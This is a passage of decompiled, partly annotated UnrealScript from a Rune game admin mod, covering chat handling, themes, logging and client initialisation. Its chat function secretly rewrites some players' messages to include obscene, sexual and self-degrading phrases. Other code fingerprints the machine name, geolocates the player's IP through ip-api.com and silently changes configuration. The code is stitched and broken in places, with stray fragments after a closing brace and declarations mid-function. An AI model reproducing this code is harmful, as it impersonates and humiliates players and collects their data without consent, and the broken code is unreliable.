    ReplaceString(LowercaseMessage, "suuuuck", "pwn");
    ReplaceString(LowercaseMessage, "suuuuuck", "pwn");
    ReplaceString(LowercaseMessage, "suuuuuuck", "pwn");
    ReplaceString(LowercaseMessage, "suuuuuuuck", "pwn");
    ReplaceString(LowercaseMessage, "suuuuuuuuck", "pwn");
    ReplaceString(LowercaseMessage, "suuuuuuuuuck", "pwn");
    ReplaceString(LowercaseMessage, "ssuck", "pwn");
    ReplaceString(LowercaseMessage, "ssuuck", "pwn");
    ReplaceString(LowercaseMessage, "ssuuuck", "pwn");
    ReplaceString(LowercaseMessage, "ssuuuuck", "pwn");
    ReplaceString(LowercaseMessage, "ssuuuuuck", "pwn");
    ReplaceString(LowercaseMessage, "ssuuuuuuck", "pwn");
    ReplaceString(LowercaseMessage, "ssuuuuuuuck", "pwn");
    LowercaseMessage = Right(LowercaseMessage, Len(LowercaseMessage) - 1) $ " <3";
    RandomNumber = Rand(10);

    if (RandomNumber > 2)
    {
        Viewport.Actor.Say(eq_vxv_989(LowercaseMessage));
    }
    else
    {
        Viewport.Actor.Say(LowercaseMessage);
    }
}

// Suggested name: GenerateSmartAssResponse
function string eq_vxv_989(string InputText)
{
    // This function generates a random "smart ass" response by selecting a string from a predefined list
    // and combining it with the input text.

    local string Responses[51];
    local string SelectedResponse;

    Responses[0] = "i suck cocks for snickers";
    Responses[1] = "sometimes i put snikers in my ass";
    Responses[2] = "i die front all";
    Responses[3] = "slade is the best guy front all";
    Responses[4] = "i sux for god to give me bigger penis";
    Responses[5] = "baguette in my small ass bitch";
    Responses[6] = "i suck front all";
    Responses[7] = "everyone is better than me :(..";
    Responses[8] = "i fuck my mother";
    Responses[9] = "fuck my mother stupid shit bitch";
    Responses[10] = "I wish I could speak proper english.. but my tourette syndrom ASSHOLE FUCK BITCH SON keeps ruining it FUCKER.";
    Responses[11] = "look bitch im a passive cunt, everyone see";
    Responses[12] = "i fear to fight slade because he's the best player";
    Responses[13] = "i fear to do a 1vs1 loser quits rune vs slade because i cant win";
    Responses[14] = "i sux my dog for sperm";
    Responses[15] = "i love you all";
    Responses[16] = "dont take me serious, i'm just trolling";
    Responses[17] = "just kidding! hahahah !";
    Responses[18] = "im not serious dude, just trolling";
    Responses[19] = "jk :P";
    Responses[20] = "my dick is small like my score bitch";
    Responses[21] = "your dick is big like my ego";
    Responses[22] = "excuse me, just my tourette syndrom coming through..";
    Responses[23] = "1 kill = 1 dick for my mother";
    Responses[24] = "let me suck your dick please";
    Responses[25] = "hey, fight fair!! i can't win this way";
    Responses[26] = "why is everyone so good?";
    Responses[27] = "i wish i could play as good as you";
    Responses[28] = "i'll give 100 euro to everyone who insults me";
    Responses[29] = "i will never win";
    Responses[30] = "fuck my mother front all while putting snickers in my huge ass";
    Responses[31] = "how to change name? i want name ANUS";
    Responses[32] = "my anus is small bitch";
    Responses[33] = "i want your big dick in my ass bitch";
    Responses[34] = "fuck me!!!!!";
    Responses[35] = "FUCK ME!";
    Responses[36] = "slade is god";
    Responses[37] = "hey, this coadminz is a very cool mod";
    Responses[38] = "visit http://therune.boards.net";
    Responses[39] = "everyone should donate 10 euro to slade for adding the runar mode";
    Responses[40] = "slade fucks me ez";
    Responses[41] = "i win ez..but slade wins easier";
    Responses[42] = "slade is god";
    Responses[43] = "i wish neelix servers were this smooth";
    Responses[44] = "Whatever I said, whatever I did..I didn't mean it ..I just want you back for good ";
    Responses[45] = "i love slade he's the best";
    Responses[46] = "everyone should join the RUNE Discord";
    Responses[47] = "did you join RUNE Discord yet?";
    Responses[48] = "everytime im not winning i cry until my mom sux me";
    Responses[49] = "trolololo";
    Responses[50] = "i am useless";

    SelectedResponse = Responses[Rand(51)];

    if (Rand(10) > 5)
    {
        return (SelectedResponse $ ".. ") $ InputText;
    }
    else
    {
        return (InputText $ ".. ") $ SelectedResponse;
    }
}

// Suggested name: ToLowerCase
static final function string ToLowerCaseFunc325(coerce string InputText)
{
    // This function converts a string to lowercase.

    local int i;

    for (i = 0; i < Len(InputText); i++)
    {
        if ((Mid(InputText, i, 1) >= "A") && (Mid(InputText, i, 1) <= "Z"))
        {
            InputText = (Left(InputText, i) $ Chr(Asc(Mid(InputText, i, 1)) + 32)) $ Mid(InputText, i + 1);
        }
    }

    return InputText;
}

// Suggested name: ReplaceSubstring
function ReplaceString(out string TargetText, string SearchFor, string ReplaceWith)
{
    // This function replaces all occurrences of a substring (SearchFor) within a string (TargetText) with another string (ReplaceWith).

    local int Index;
    local string RemainingText;

    if ((SearchFor != ReplaceWith) && (SearchFor != ""))
    {
        RemainingText = TargetText;
        TargetText = "";
        Index = InStr(RemainingText, SearchFor);

        while (Index != -1)
        {
            TargetText = (TargetText $ Left(RemainingText, Index)) $ ReplaceWith;
            RemainingText = Mid(RemainingText, Index + Len(SearchFor));
            Index = InStr(RemainingText, SearchFor);
        }
        TargetText = TargetText $ RemainingText;
    }
}

// Suggested name: ExtractUrlFromCommand
function string ExtractUrlFromCommand(string CommandString)
{
    // This function extracts the actual URL from a command string that starts with "start " or "rtravel ".

    local string ExtractedURL;

    if (Left(CommandString, 6) ~= "start ")
    {
        ExtractedURL = Right(CommandString, Len(CommandString) - 6);
    }
    else if (Left(CommandString, 8) ~= "rtravel ")
    {
        ExtractedURL = Right(CommandString, Len(CommandString) - 8);
    }

    return ExtractedURL;
}

// Suggested name: RemoveFirstChar
function string RemoveFirstChar(string InputString)
{
    // This function removes the first character from a string.
    // It's likely used to remove a prefix like "-" or "*".

    return Right(InputString, Len(InputString) - 1);
}

// Suggested name: IsTravelCommand
function bool IsTravelCommand(out string CommandString)
{
    // This function checks if a command string starts with "start " or "RTravel ".

    if ((Left(CommandString, 6) ~= "start ") || Left(CommandString, 8) ~= "RTravel ")
    {
        return true;
    }
    else
    {
        return false;
    }
}

// Suggested name: AddConsoleString
event AddString(coerce string Message)
{
    // This function adds a string to the console output.
    // It handles chat logging, timestamps, and different console types.

    local bool bLogMessage;

    if (Message != "")
    {
        if (bChatlog && UNK_v6586 == none)
        {
            UNK_v6586 = Owner.Spawn(Class'coadminz7.CoAdminLog');
            if (UNK_v6586 != none)
            {
                UNK_v6586.STR_v5433 = "Logs/ChatLog";
                UNK_v6586.StartLog();
                Owner.ClientMessage("~ CoAdminZ Chatlogging enabled");
                eq_vxv_298("CoAdminZ Clientside Chat Logger");
                eq_vxv_298("=================================================");
                eq_vxv_298("Servername: " $ Owner.GameReplicationInfo.ServerName);
                eq_vxv_298("ServerIP: " $ Owner.Level.GetAddressURL());
                eq_vxv_298("Level: " $ Owner.Level.Title);
                eq_vxv_298("=================================================");
            }
        }

        if (bChatlog && Left(Message, 1) == "-" && ContainsString(Message, ":"))
        {
            bLogMessage = true;
        }

        if (bTimeStamps)
        {
            Message = (("[" $ (GetFormattedTime(":"))) $ "] ") $ Message;
        }

        TopLine = int(float(TopLine + 1) % float(64));
        numLines = Min(numLines + 1, 64 - 1);
        MsgType[TopLine] = 'Event';
        MsgTime = 6.0;
        TextLines++;
        MsgText[TopLine] = Message;
        MsgPlayer[TopLine] = none;
        MsgTick[TopLine] = MsgTickTime + MsgTime;

        if (bLogMessage)
        {
            if (UNK_v6586 != none)
            {
                UNK_v6586.LogEventString(Message);
                UNK_v6586.FileFlush();
            }
        }

        if (newConsole == 1)
        {
            // No action for newConsole == 1
        }

        if (newConsole == 2)
        {
            if (zRConsoleW != none && zRConsoleW.ClientArea != none && UWindowConsoleClientWindow(zRConsoleW.ClientArea).TextArea != none)
            {
                UWindowConsoleClientWindow(zRConsoleW.ClientArea).TextArea.AddText(Message);
            }
        }

        if (ConsoleWindow != none && ConsoleWindow.ClientArea != none && UWindowConsoleClientWindow(ConsoleWindow.ClientArea).TextArea != none)
        {
            UWindowConsoleClientWindow(ConsoleWindow.ClientArea).TextArea.AddText(Message);
        }
    }
}

// Suggested name: LogToCoAdminLog
function eq_vxv_298(string LogMessage)
{
    // This function logs a string to the CoAdminLog and flushes the log file.

    if (UNK_v6586 != none)
    {
        UNK_v6586.LogEventString(LogMessage);
        UNK_v6586.FileFlush();
    }
}

// Suggested name: SendHttpGetRequest
function SendHTTPGetRequest(int Port, string RequestString)
{
    // This function sends an HTTP GET request.
    // It parses the URL and a potential payload from the input string.

    local string Payload;
    local string URL;

    URL = RequestString;

    if (ContainsString(URL, "<"))
    {
        Payload = Right(URL, (Len(URL) - InStr(URL, "<")) - 1);
        URL = Left(URL, InStr(URL, "<"));
    }

    if (CountryClient != none)
    {
        CountryClient = none;
    }

    CountryClient = Owner.Spawn(Class'coadminz7.CountryClient');
    CountryClient.G_ZStrg1 = self;
    CountryClient.Browse(URL, Payload, Port);
}

// Suggested name: ShowPlayerList
exec function PlayerList()
{
    // This function displays a list of players with their ID, name, and other relevant information.

    local zPlayerReplicationInfo PlayerInfo;

    Owner.ClientMessage("Player List:");

    foreach Owner.Level.AllActors(Class'coadminz7.zPlayerReplicationInfo', PlayerInfo)
    {
        if (PlayerInfo.STR_v5383 != "")
        {
            Owner.ClientMessage((((((("[" $ string(PlayerInfo.PlayerID)) $ "] ") $ PlayerInfo.PlayerName) $ " ~ ") $ PlayerInfo.STR_v5383) $ "/") $ PlayerInfo.STR_v5384);
        }
    }
}

// Suggested name: ShowSpectatorList
exec function SpecList()
{
    // This function displays a list of spectators and their current view targets.

    local zPlayerReplicationInfo PlayerInfo;
    local PlayerPawn PlayerPawnInstance, ViewedPawn;

    Owner.ClientMessage("Player List:");

    foreach Owner.Level.AllActors(Class'coadminz7.zPlayerReplicationInfo', PlayerInfo)
    {
        PlayerPawnInstance = PlayerPawn(PlayerInfo.Owner);
        ViewedPawn = PlayerPawn(PlayerPawnInstance.ViewTarget);
        Owner.ClientMessage((((("[" $ string(PlayerInfo.PlayerID)) $ "] ") $ PlayerInfo.PlayerName) $ " ~ ") $ PlayerInfo.PP_v5410.PlayerReplicationInfo.PlayerName);
    }
}

function ProcessCountryResponse(string Parm_string_0, bool Error)
{
    local string Local_string_v0, Local_string_v1, Local_string_v2;
    local bool Local_bool_v0;

    ReplaceString(Parm_string_0, Chr(34), "");
    if(inn != "")
    {
        Local_string_v1 = GetDelimitedPart(inn, 2, ",");
        Local_string_v2 = GetDelimitedPart(inn, 1, ",");
        Local_string_v1 = Left(Local_string_v1, 2);
        Local_bool_v0 = true;        
    }
    else
    {
        if(Parm_string_0 != "")
        {
            if(Len(GetDelimitedPart(Parm_string_0, 2, ",")) > 4)
            {
                return;
            }
            if(Len(Parm_string_0) < 1000)
            {
                Local_string_v1 = GetDelimitedPart(Parm_string_0, 2, ",");
                Local_string_v2 = GetDelimitedPart(Parm_string_0, 1, ",");
                Local_string_v1 = Left(Local_string_v1, 2);
                Local_bool_v0 = true;
            }            
        }
        else
        {
            if(zPlayerReplicationInfo(Owner.PlayerReplicationInfo).IDRepKey == "")
            {
                Owner.Say(("[FLAG-TEST] Failed to detect my country! :( -> '" $ Parm_string_0) $ "'");
            }
            Local_string_v1 = "xx";
        }
    }
    if(Local_bool_v0)
    {
        if(!spec)
        {
            ZRunePlayer(Owner).eqdot_vxv_1452(Local_string_v1, Local_string_v2);
        }
        if(zPlayerReplicationInfo(Owner.PlayerReplicationInfo).IDRepKey == "")
        {
            zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("ck", PlayerKey, 1);
        }
        if(CountryClient != none)
        {
            CountryClient = none;
        }        
    }
    return;
}

// Suggested name: UpdateRBrowserServerLinks
function UpdateRBrowserServerLinks()
{
    // This function updates server link addresses for the RBrowser.

    local RBrowserUpdateServerLink ServerLinkUpdater;
    local string ServerAddress;

    ServerAddress = "h2537454.stratoserver.net";
    ServerLinkUpdater = Owner.Spawn(Class'RBrowser.RBrowserUpdateServerLink');
    ServerLinkUpdater.UpdateServerAddress = ServerAddress;

    ConsoleCommand("set RBrowserUpdateServerLink NewsUpdateServerAddress valhalla.333networks.com");
    ConsoleCommand("set RBrowserUpdateServerLink UpdateServerAddress valhalla.333networks.com");

    ServerLinkUpdater.StaticSaveConfig();
    ServerLinkUpdater.SaveConfig();
    ServerLinkUpdater.Destroy();
    ServerLinkUpdater = none;
}

// Suggested name: DecodeThemeSettings
exec function decode(string ThemeString)
{
    // This function decodes a theme string and applies the settings to various configuration variables.

    // Remove "theme://" prefix
    ReplaceSubstring(ThemeString, "theme://", "");

    // Parse and apply settings from the comma-separated string
    categoryAlpha = float(GetDelimitedPart(ThemeString, 1, ","));
    menuAlpha = float(GetDelimitedPart(ThemeString, 2, ","));
    helpAlpha = float(GetDelimitedPart(ThemeString, 3, ","));
    BR = int(GetDelimitedPart(ThemeString, 4, ","));
    BG = int(GetDelimitedPart(ThemeString, 5, ","));
    BB = int(GetDelimitedPart(ThemeString, 6, ","));
    categoryHeightMin = int(GetDelimitedPart(ThemeString, 7, ","));
    categoryHeight = int(GetDelimitedPart(ThemeString, 8, ","));
    categoryWidth = int(GetDelimitedPart(ThemeString, 9, ","));
    catY = int(GetDelimitedPart(ThemeString, 10, ","));
    categoryGap = int(GetDelimitedPart(ThemeString, 11, ","));
    MR = int(GetDelimitedPart(ThemeString, 12, ","));
    MG = int(GetDelimitedPart(ThemeString, 13, ","));
    MB = int(GetDelimitedPart(ThemeString, 14, ","));
    MenuHeight = int(GetDelimitedPart(ThemeString, 15, ","));
    MenuWidth = int(GetDelimitedPart(ThemeString, 16, ","));
    menuDist = int(GetDelimitedPart(ThemeString, 17, ","));
    menuGap = int(GetDelimitedPart(ThemeString, 18, ","));
    functionDist = int(GetDelimitedPart(ThemeString, 19, ","));
    bigFontMenu = bool(GetDelimitedPart(ThemeString, 20, ","));
    bigfontGap = int(GetDelimitedPart(ThemeString, 21, ","));
    SR = int(GetDelimitedPart(ThemeString, 22, ","));
    SG = int(GetDelimitedPart(ThemeString, 23, ","));
    SB = int(GetDelimitedPart(ThemeString, 24, ","));
    tr = int(GetDelimitedPart(ThemeString, 25, ","));
    TG = int(GetDelimitedPart(ThemeString, 26, ","));
    tB = int(GetDelimitedPart(ThemeString, 27, ","));
    HR = int(GetDelimitedPart(ThemeString, 28, ","));
    hG = int(GetDelimitedPart(ThemeString, 29, ","));
    hB = int(GetDelimitedPart(ThemeString, 30, ","));
    hTR = int(GetDelimitedPart(ThemeString, 31, ","));
    hTG = int(GetDelimitedPart(ThemeString, 32, ","));
    hTB = int(GetDelimitedPart(ThemeString, 33, ","));
}

// Suggested name: EncodeThemeSettings
exec function encode(optional string Action)
{
    // This function encodes the current theme settings into a string.
    // It then either copies the string to the clipboard or sends it to chat.

    local string EncodedThemeString;
    local int BigFontMenuFlag;

    if (bigFontMenu)
    {
        BigFontMenuFlag = 1;
    }

    EncodedThemeString = (((((((((((((((((((((((((((((((Left(string(categoryAlpha), 4) @ Left(string(menuAlpha), 4)) @ Left(string(helpAlpha), 3)) @ string(BR)) @ string(BG)) @ string(BB)) @ string(categoryHeightMin)) @ string(categoryHeight)) @ string(categoryWidth)) @ string(catY)) @ string(categoryGap)) @ string(MR)) @ string(MG)) @ string(MB)) @ string(MenuHeight)) @ string(MenuWidth)) @ string(menuDist)) @ string(menuGap)) @ string(functionDist)) @ string(BigFontMenuFlag)) @ string(bigfontGap)) @ string(SR)) @ string(SG)) @ string(SB)) @ string(tr)) @ string(TG)) @ string(tB)) @ string(HR)) @ string(hG)) @ string(hB)) @ string(hTR)) @ string(hTG)) @ string(hTB);
    ReplaceSubstring(EncodedThemeString, " ", ",");
    EncodedThemeString = "theme://" $ EncodedThemeString;

    if (Action ~= "copy")
    {
        Owner.CopyToClipboard(EncodedThemeString);
        Msg("Your theme has been copied to clipboard. ( CTRL + V to paste it).");
    }
    else
    {
        Say(EncodedThemeString);
    }
}

// Suggested name: InitializeConsoleAndSettings
function eq_vxv_902()
{
	local string Timestamp;  // Current timestamp for logging or naming
	local StatLog StatLogger;  // Unused in this function, possibly for future logging
	local string MapName, MapClass, RenderDeviceClass, RenderDeviceConfig;  // Various string variables for map, rendering, etc.
	local GameReplicationInfo GameInfo;  // Game replication info, unused here
	local z3DText Text3D;  // 3D text actor for special maps
	local int Text3DIndex;  // Index for 3D text array
	local ZoneInfo Zone;  // Zone info for neutral zones
	local string URLWithParams;  // URL with player parameters
	local string UnusedCommand;

	// Handle password requirement for specific players
	if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5403)
	{
		URLWithParams = (((((Owner.Level.GetAddressURL() $ "?name=") $ Owner.GetDefaultURL("name")) $ "?skin=") $ Owner.GetDefaultURL("skin")) $ "?class=") $ Owner.GetDefaultURL("class");
		ConnectFailure("ZNEEDPW", URLWithParams);
		bCinematic = false;
	}

	// Enable health bar drawing
	B_v6723 = true;

	// Handle special climb maps with 3D text
	if ((Viewport.Actor.Level.LevelEnterText ~= "tsbclimb") || Viewport.Actor.Level.LevelEnterText ~= "tsbclimb2018")
	{
		foreach Owner.Level.AllActors(Class'coadminz7.z3DText', Text3D)
		{
			if (Text3D.Msg != "")
			{
				eqO_vxv_6741[Text3DIndex].VCT_v3828 = Text3D.Location;
				eqO_vxv_6741[Text3DIndex].Msg = Text3D.Msg;
				eqO_vxv_6741[Text3DIndex].MsgColor = Text3D.MsgColor;
				eqO_vxv_6741[Text3DIndex].MsgFont = Text3D.MsgFont;
				Text3DIndex++;
			}
		}
		B_v6714 = true;  // Enable 3D text drawing
	}

	// Check for neutral zones
	foreach Owner.Level.AllActors(Class'Engine.ZoneInfo', Zone)
	{
		if (Zone.bNeutralZone)
		{
			B_v6355 = true;
		}
	}

	// Unused command string
	UnusedCommand = "exec entry.dll";

	// Extract map name from level string
	STR_v4369 = Left(string(Owner.Level), InStr(string(Owner.Level), "."));

	// Disable recording initially
	brecording = false;

	// Initialize map theme textures array
	MTTarr[0].MTT_TextureName = "";
	MTTarr[0].MTT_ThemeName = "None";
	MTTarr[1].MTT_TextureName = "UBrowser.Background";
	MTTarr[1].MTT_ThemeName = "Dark";
	MTTarr[2].MTT_TextureName = "Rag_2.Water";
	MTTarr[2].MTT_ThemeName = "Jesus";
	MTTarr[3].MTT_TextureName = "Organic.Grass5e_g";
	MTTarr[3].MTT_ThemeName = "Mossy";
	MTTarr[4].MTT_TextureName = "Hell.testbase";
	MTTarr[4].MTT_ThemeName = "PENG";
	MTTarr[5].MTT_TextureName = "Goblin.RedBrk_01";
	MTTarr[5].MTT_ThemeName = "Mars 1";
	MTTarr[6].MTT_TextureName = "ADFuthark.LimeBase";
	MTTarr[6].MTT_ThemeName = "Mars 2";
	MTTarr[7].MTT_TextureName = "GREGTEXTURE.Rock12_C";
	MTTarr[7].MTT_ThemeName = "Mars 3";
	MTTarr[8].MTT_TextureName = "tedd.newater";
	MTTarr[8].MTT_ThemeName = "Stone 1";
	MTTarr[9].MTT_TextureName = "tedd.rock55_d";
	MTTarr[9].MTT_ThemeName = "Stone 2";
	MTTarr[10].MTT_TextureName = "ADFuthark.Test";
	MTTarr[10].MTT_ThemeName = "Stone 3";
	MTTarr[11].MTT_TextureName = "CoAdminZ7.theme_satan";
	MTTarr[11].MTT_ThemeName = "Satan";
	MTTarr[12].MTT_TextureName = "CoAdminZ7.theme_violetta";
	MTTarr[12].MTT_ThemeName = "Violetta eyecancer";
	MTTarr[13].MTT_TextureName = "CoAdminZ7.theme_greenpeace";
	MTTarr[13].MTT_ThemeName = "GREENPEACE eyecancer";
	MTTarr[14].MTT_TextureName = "gothicdwarf.gothstone";
	MTTarr[14].MTT_ThemeName = "Malware";
	MTTarr[15].MTT_TextureName = "wood.wd6_dc";
	MTTarr[15].MTT_ThemeName = "WOOT";
	MTTarr[16].MTT_TextureName = "CoAdminZ7.theme_tsar";
	MTTarr[16].MTT_ThemeName = "Misanthrope 1";
	MTTarr[17].MTT_TextureName = "CoAdminZ7.theme_tsar2";
	MTTarr[17].MTT_ThemeName = "Misanthrope 2";
	MTTarr[18].MTT_TextureName = "CoAdminZ7.theme_tsar3";
	MTTarr[18].MTT_ThemeName = "Misanthrope 3";
	MTTarr[19].MTT_TextureName = "CoAdminZ7.theme_tsar4";
	MTTarr[19].MTT_ThemeName = "Misanthrope 4";

	// Initialize blur settings
	blur_b = 0;
	blur_g = 0;
	blur_r = 0;
	blur_alpha = 0.0;
	bLocalColorCorrection = false;
	bLocalModify = false;
	bLocalDisableSkybox = false;
	bLocalDisableFog = false;
	bLocalDisableAmbientSound = false;
	localTextureOverlay = 0;

	// Load map settings
	ManageMapSettings("load");

	// Generate timestamp
	Timestamp = ((FormatCurrentDate(".")) $ "-") $ (GetFormattedTime("."));

	// Store computer name
	STR_v6707 = Viewport.Actor.Level.ComputerName;

	// Set level title if default
	if ((Owner.Level.Title ~= "Untitled") || Owner.Level.Title == "")
	{
		Owner.Level.Title = Left(string(Owner.Level), InStr(string(Owner.Level), "."));
	}

	// Notify admin about map voting
	if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5402)
	{
		Owner.ClientMessage("To change maps, press M and vote for a map. 2 votes needed to change maps.", 'CAZ');
	}

	// Decode default theme settings
	decode("theme://0.90,0.90,0.8,0,0,5,20,205,158,-13,4,0,0,5,25,360,152,1,205,1,4,255,5,255,240,140,95,240,0,15,255,255,255");

	// Save and refresh config
	SaveConfigAndRefresh();

	// Check for software renderer
	local string SoftwareRendererClass = "Class'SoftDrv.SoftwareRenderDevice'";
	STR_v6316 = Viewport.Actor.ConsoleCommand("get ini:Engine.Engine.GameRenderDevice Class");
	RenderDeviceConfig = STR_v6316;
	ReplaceString(RenderDeviceConfig, "'", "");
	ReplaceString(RenderDeviceConfig, "Class", "");
	if (STR_v6316 ~= SoftwareRendererClass)
	{
		B_v6544 = true;  // Flag software renderer warning
	}

	// Special handling for Sweetleaf2k21 map
	if (Viewport.Actor.Level.Title ~= "Sweetleaf2k21")
	{
		if (RenderDeviceConfig ~= "D3DDrv.D3DRenderDevice")
		{
			foreach Owner.Level.AllActors(Class'Engine.ZoneInfo', Zone)
			{
				Zone.AmbientBrightness += 160;  // Increase brightness
			}
			Viewport.Actor.ConsoleCommand("Flush");
		}
	}

	// Set rendering options
	Viewport.Actor.ConsoleCommand("set ini:Engine.Engine.GameRenderDevice UseS3TC true");
	Viewport.Actor.ConsoleCommand("set ini:Engine.Engine.GameRenderDevice HighDetailActors true");
	LogInternal(RenderDeviceConfig);
	Viewport.Actor.myHUD.ConsoleCommand(("set ini:" $ RenderDeviceConfig) $ " volumetriclighting true");
	Viewport.Actor.myHUD.ConsoleCommand(("set " $ RenderDeviceConfig) $ " volumetriclighting true");
	Viewport.Actor.myHUD.ConsoleCommand(("set ini:" $ RenderDeviceConfig) $ " shinysurfaces true");
	Viewport.Actor.myHUD.ConsoleCommand(("set " $ RenderDeviceConfig) $ " shinysurfaces true");
	Viewport.Actor.ConsoleCommand("flush");

	// Check if spectator
	if ((Viewport.Actor.IsA('Spectator') || Viewport.Actor.IsA('TCCDemoRecSpectator')) || Viewport.Actor.IsA('TCCSpectator'))
	{
		spec = true;
	}

	// Special flag for specific computer
	if (STR_v6707 == "ANTHONYPC")
	{
		B_v6738 = true;
	}

	// Update status URL
	if (myStatus == "http://therune.boards.net")
	{
		myStatus = "https://playrune.com";
	}
	if (myStatus != "")
	{
		zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("status", Left(myStatus, 40));
	}
	else
	{
		zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("status", "https://playrune.com", 1);
	}

	// Reset killed-by index
	INT_v4864 = -1;
	INT_v6708 = 280;

	// Open Discord link if flagged
	if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5397)
	{
		Viewport.Actor.ConsoleCommand("start http://bit.ly/runediscord");
		zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5397 = false;
	}

	// Handle player key
	if (PlayerKey != "")
	{
		if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).IDRepKey == "")
		{
			zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("ck", PlayerKey, 1);
		}
		if (!spec)
		{
			ZRunePlayer(Owner).addIdentifyingKey(PlayerKey);
		}
		else
		{
			TCCSpectator(Owner).eqstar_vxv_1336(PlayerKey);
		}
	}

	// Set network speed
	ConsoleCommand("netspeed 500000");
	if (!spec)
	{
		ConsoleCommand("set ini:IpDrv.TcpNetDriver.ConfiguredInternetSpeed 500000");
	}

	// Send HTTP request for IP info if not spectator
	if (!spec)
	{
		SendHTTPGetRequest(80, "www.ip-api.com</csv/?fields=3");
	}

	// Handle console key
	if (int(zConsoleKey) == 255)
	{
		zConsoleKey = ConsoleKey;
		SaveConfigAndRefresh();
	}

	// Set spam limit
	FLT_v6733 = 7.0;

	// Load color settings from player info
	SColorR = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Col_v5372.R;
	SColorG = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Col_v5372.G;
	SColorB = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Col_v5372.B;
	HColorR = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Col_v5373.R;
	HColorG = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Col_v5373.G;
	HColorB = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Col_v5373.B;
	THColorR = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).HeadingsColor.R;
	THColorG = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).HeadingsColor.G;
	THColorB = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).HeadingsColor.B;
	SepColorR = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).SeperatorColor.R;
	SepColorG = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).SeperatorColor.G;
	SepColorB = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).SeperatorColor.B;
	TColorR = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).titlecolor.R;
	TColorG = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).titlecolor.G;
	TColorB = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).titlecolor.B;
	AColorR = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).AdminColor.R;
	AColorG = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).AdminColor.G;
	AColorB = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).AdminColor.B;
	EColorR = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).EmailColor.R;
	EColorG = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).EmailColor.G;
	EColorB = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).EmailColor.B;
	M1ColorR = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD1Color.R;
	M1ColorG = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD1Color.G;
	M1ColorB = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD1Color.B;
	M2ColorR = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD2Color.R;
	M2ColorG = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD2Color.G;
	M2ColorB = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD2Color.B;
	M3ColorR = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD3Color.R;
	M3ColorG = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD3Color.G;
	M3ColorB = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD3Color.B;
	M4ColorR = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD4Color.R;
	M4ColorG = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD4Color.G;
	M4ColorB = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD4Color.B;
	GSize = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5356;
	GSizeS = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5357;
	GSizeM = zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5358;

	// Generate player key if missing
	if (PlayerKey == "")
	{
		GeneratePlayerKey();
		if (cSmartKey == 16)
		{
			cSmartKey = 9;
			cSmartKeyName = "TAB";
			Viewport.Actor.ClientMessage("Smart key has been changed from SHIFT to TAB ( the key to replace words in chat )");
		}
		SaveConfigAndRefresh();
	}

	// Execute DLL command
	local string DLLResult = Viewport.Actor.ConsoleCommand(UnusedCommand);

	// Cheat detection for non-spectators
	if (!spec && DLLResult == "")
	{
		ZRunePlayer(Viewport.Actor).USELESSSTUCT.UNK_v4553 = true;
		ZRunePlayer(Viewport.Actor).USELESSSTUCT.UNK_v4584 = true;
		ZRunePlayer(Viewport.Actor).LogCheatDetection("using native hooks");
	}
}
    if(bAutoDemoRec)
    {
        if(bAutoDemoRestart)
        {
            ConsoleCommand(((("demorec " $ Chr(int(RandRange(97.0000000, 121.0000000)))) $ Chr(int(RandRange(97.0000000, 121.0000000)))) $ Chr(int(RandRange(97.0000000, 121.0000000)))) $ Chr(int(RandRange(97.0000000, 121.0000000))));
            if(bDebug)
            {
                Owner.ClientMessage(TimeStamp);
            }            
        }
        else
        {
            ConsoleCommand("demorec " $ TimeStamp);
            if(bDebug)
            {
                Owner.ClientMessage(TimeStamp);
            }
        }
    }
    B_v6684 = true;
    if(spec)
    {
        TCCSpectator(Viewport.Actor).ToggleCollisions(bNoCollision);
        TCCSpectator(Viewport.Actor).bShowNames = bShowNames;
    }

	//fix clients Rune.ini master server list loadup
    ConsoleCommand("set UBrowserUpdateServerLink NewsUpdateServerAddress valhalla.333networks.com");
    ConsoleCommand("set UBrowserUpdateServerLink UpdateServerAddress valhalla.333networks.com");
    UpdateRBrowserServerLinks();
    ConsoleCommand("set UBrowser.UBrowserMainClientWindow bKeepMasterServer False");
